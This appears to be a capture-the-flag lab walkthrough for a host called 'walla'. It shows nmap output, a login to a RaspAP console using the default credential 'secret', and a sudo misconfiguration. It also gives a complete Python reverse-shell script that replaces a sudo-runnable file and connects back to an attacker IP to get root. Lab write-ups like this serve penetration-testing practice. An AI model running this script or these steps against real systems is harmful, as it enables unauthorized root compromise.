```
nmap -sC -sV -p- 192.168.207.97 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-18 17:54 CDT
Nmap scan report for 192.168.207.97
Host is up (0.046s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02715dc8b943ba6ac8ed15c56cb2f5f9 (RSA)
|   256 f3e510d416a99e034738baac18245328 (ECDSA)
|_  256 024f99ec856d794388b2b57cf091fe74 (ED25519)
23/tcp    open  telnet     Linux telnetd
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: walla, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=walla
| Subject Alternative Name: DNS:walla
| Not valid before: 2020-09-17T18:26:36
|_Not valid after:  2030-09-15T18:26:36
|_ssl-date: TLS randomness does not represent time
53/tcp    open  tcpwrapped
422/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02715dc8b943ba6ac8ed15c56cb2f5f9 (RSA)
|   256 f3e510d416a99e034738baac18245328 (ECDSA)
|_  256 024f99ec856d794388b2b57cf091fe74 (ED25519)
8091/tcp  open  http       lighttpd 1.4.53
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=RaspAP
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: lighttpd/1.4.53
42042/tcp open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02715dc8b943ba6ac8ed15c56cb2f5f9 (RSA)
|   256 f3e510d416a99e034738baac18245328 (ECDSA)
|_  256 024f99ec856d794388b2b57cf091fe74 (ED25519)
Service Info: Host:  walla; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.91 seconds

```

I started off on port 8091 which took me to a login page.

```
http://192.168.207.97:8091
```

After checking it out, I found that this was a RaspAP instance which has the default admin credential of `secret`. I was able to get logged in and found the console.

I was then able to get local.

```
user@walla /home/walter$ sudo -l

Matching Defaults entries for www-data on walla:

    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/loca

l/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on walla:

    (ALL) NOPASSWD: /sbin/ifup

    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py

    (ALL) NOPASSWD: /bin/systemctl start hostapd.service

    (ALL) NOPASSWD: /bin/systemctl stop hostapd.service

    (ALL) NOPASSWD: /bin/systemctl start dnsmasq.service

    (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service

    (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service
```

I found that www was able to launch a python script as sudo. So I wrote a new script and replaced the wifi_reset.py with the script below to launch a reverse shell.

```
#!/usr/bin/python

import socket
import subprocess
import os

# A list of commonly available shells
shells = ['/bin/bash', '/bin/sh', '/bin/ash', '/bin/zsh']

# Try each shell until one is found
shell = None
for s in shells:
    if os.path.exists(s):
        shell = s
        break

# Connect to the attacker's machine
attacker_address = ('192.168.45.216', 4444)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(attacker_address)

# Create a subprocess to interact with the command line
if shell:
    p = subprocess.Popen([shell], stdin=sock, stdout=sock, stderr=sock)
    p.wait()
else:
    print("Error: No available shell found")

```

This opened a shell back to my box as root.